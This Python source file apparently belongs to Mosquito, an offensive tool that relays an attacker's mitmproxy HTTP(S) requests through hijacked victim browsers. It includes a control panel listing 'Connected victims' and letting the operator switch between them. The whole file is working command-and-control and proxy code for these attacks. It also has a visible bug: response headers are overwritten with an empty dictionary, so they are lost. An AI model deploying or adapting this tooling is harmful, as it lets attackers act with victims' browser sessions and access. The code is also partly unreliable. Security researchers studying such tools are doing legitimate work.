from server import MosquitoTCPServer, MosquitoRequestHandler, MosquitoRequest
import threading
from libmproxy import flow
from netlib.odict import ODictCaseless
import logging
from cgi import parse_qs, escape

class MosquitoToMitmproxyConnector:
    """
        Class used to get HTTP(s) requests from mitmproxy codebase and proxy them
        via Mosquito TCP server.
    """

    def __init__(self, host, port):
        """
            Starts Mosquito TCP server
        """
        self.server = MosquitoTCPServer((host, port), MosquitoRequestHandler)
        ip, port = self.server.server_address
        self.ip = ip
        self.port = port

        # Start a thread with the server -- that thread will then start one
        # more thread for each request
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        # Exit the server thread when the main thread terminates
        self.server_thread.daemon = True
        self.server_thread.start()

    def build_mosquito_request(self, r):
        flatheaders = []
        for i in r.headers.keys():
            flatheaders.append([i, "".join(r.headers.get(i))])

        logging.info("%s %s", r.method, r.get_url())

        m_r = MosquitoRequest('xhr',{
            'url': r.get_url(),
            'method': r.method,
            'headers': flatheaders,
            'body': r.content,
        })

        logging.debug("Created req #%d, %s"  %(m_r.id, r.get_url()))
        return m_r

    def build_flow_response(self, req, status, status_text, headers, body):
        headers = ODictCaseless()
        for k,v in headers:
            headers[k] = v
        logging.info("%d %s (%d) [%s %s]: ", status, status_text, len(body), req.method, req.get_url())
        resp = flow.Response(req,
                [1,1],
                status, status_text,
                headers,
                body,
                None)
        return resp

    def handle_flow_request(self, r):
        m_req = self.build_mosquito_request(r)

        while not self.server.get_client():
            pass

        status, statusText, headers, body = self.server.get_client().send_request_and_wait(m_req)
        m_resp = self.build_flow_response(r, status, statusText, headers, body)
        r.reply(m_resp)

    def handle_wsgi_request(self, environ, start_response):
        url = environ['wsgi.url_scheme'] + "://" + environ['HTTP_HOST'] + ':' + environ['SERVER_PORT'] + environ['PATH_INFO']
        params = {}
        if environ['QUERY_STRING']:
            url += '?' + environ['QUERY_STRING']
            params = parse_qs(environ['QUERY_STRING'])

        logging.debug("start wsgi request %s" % url)

        message = ''
        # hdrs = []

        # for k, v in environ.iteritems():
        #     if k.startswith('HTTP_'):
        #         hdrs.append([k[5:].capitalize().replace('_', '-'), v])

        # if environ['CONTENT_TYPE']:
        #     hdrs.append(['Content-Type', environ['CONTENT_TYPE']])

        if 'cmd' in params and params['cmd'][0] == 'switch_client':
            try:
                new_client = int(params['client'][0])
                if self.server.clients[new_client]:
                    self.server.default_client = new_client
                    message = "Default client is #%d" % new_client
            except:
                pass


        body = """<!doctype html><body><h1>Mosquito control panel</h1>
<p><a href="https://github.com/koto/mosquito">Mosquito</a> by <a href="http://blog.kotowicz.net">Krzysztof Kotowicz</a>
<h2>%s</h2>
<p>Connected victims:
<p>Legend: <code>ip:port url (req_sent/resp_recieved last_response_time)</code>
<ul>%s
</ul></body>
"""
        clients = ""
        for k,v in enumerate(self.server.clients):
            clients += '<li>'
            if self.server.get_client() == self.server.clients[k]:
                clients += "<strong>"
            clients += escape(str(v), True) + ' <a href="?cmd=switch_client&amp;client=' + str(k) + '">(switch to this)</a>'
            if 'url' in v.hello_msg:
                clients += ' <a href="%s" target="_blank">(link)</a>' % escape(v.hello_msg['url'], True)
            clients += '</li>'

        body = body % (message, clients)

        response_headers = [('Content-Type', 'text/html'),
                           ('Content-Length', str(len(body)))]

        start_response("200 OK", response_headers)
        logging.debug("end wsgi")
        return [body]
